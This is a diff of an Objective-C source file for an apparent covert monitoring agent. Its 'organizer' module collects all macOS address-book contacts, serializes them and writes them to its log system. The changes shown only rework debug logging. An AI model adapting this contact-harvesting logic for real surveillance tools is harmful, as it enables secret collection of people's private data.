@@ -10,10 +10,11 @@
 #import <AddressBook/AddressBook.h>
 #import "RCSMAgentOrganizer.h"
 
-//#define DEBUG
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
+
 
 static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
-
 
 @interface RCSMAgentOrganizer (private)
 
@@ -48,8 +49,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (void)_grabAllContacts
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ORGANIZER
+  infoLog(@"");
 #endif
   
   ABAddressBook *addressBook = [ABAddressBook sharedAddressBook];
@@ -79,8 +80,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ORGANIZER
+  infoLog(@"");
 #endif
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
@@ -101,8 +102,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
                                                         outSize: &blockSize];
       [serializedData retain];
       
-#ifdef DEBUG
-      NSLog(@"blockSize: %d", blockSize);
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"blockSize: %d", blockSize);
 #endif
       
       additionalHeader->size        = blockSize;
@@ -495,8 +496,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (BOOL)_logData: (NSMutableData *)aLogData
 {
-#ifdef DEBUG
-  infoLog(ME, @"");
+#ifdef DEBUG_ORGANIZER
+  infoLog(@"");
 #endif
   
   RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
@@ -505,8 +506,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
                 agentHeader: nil
                   withLogID: 0] == FALSE)
     {
-#ifdef DEBUG
-      errorLog(ME, @"An error occurred while creating log");
+#ifdef DEBUG_ORGANIZER
+      errorLog(@"An error occurred while creating log");
 #endif
       
       return FALSE;
@@ -516,8 +517,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
                         forAgent: AGENT_ORGANIZER
                        withLogID: 0] == FALSE)
       {
-#ifdef DEBUG
-        errorLog(ME, @"An error occurred while writing data");
+#ifdef DEBUG_ORGANIZER
+        errorLog(@"An error occurred while writing data");
 #endif
         
         return FALSE;
@@ -609,9 +610,9 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
-#ifdef DEBUG
-  NSLog(@"Agent organizer started");
-  NSLog(@"AgentConf: %@", mConfiguration);
+#ifdef DEBUG_ORGANIZER
+  infoLog(@"Agent organizer started");
+  infoLog(@"AgentConf: %@", mConfiguration);
 #endif
   
   [mConfiguration setObject: AGENT_RUNNING
@@ -644,8 +645,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
       sleep(1);
     }
   
-#ifdef DEBUG
-  warnLog(ME, @"STOPPING");
+#ifdef DEBUG_ORGANIZER
+  warnLog(@"STOPPING");
 #endif
   
   if ([mConfiguration objectForKey: @"status"] == AGENT_STOP)
@@ -659,16 +660,16 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 - (BOOL)stop
 {
-#ifdef DEBUG
-  warnLog(ME, @"");
+#ifdef DEBUG_ORGANIZER
+  warnLog(@"");
 #endif
   int internalCounter = 0;
   
   [mConfiguration setObject: AGENT_STOP
                      forKey: @"status"];
   
-#ifdef DEBUG
-  warnLog(ME, @"Configuration set to STOP, now waiting");
+#ifdef DEBUG_ORGANIZER
+  warnLog(@"Configuration set to STOP, now waiting");
 #endif
   
   while ([mConfiguration objectForKey: @"status"] != AGENT_STOPPED
@@ -678,8 +679,8 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
       sleep(1);
     }
   
-#ifdef DEBUG
-  warnLog(ME, @"STOPPED");
+#ifdef DEBUG_ORGANIZER
+  warnLog(@"STOPPED");
 #endif
 
   return YES;
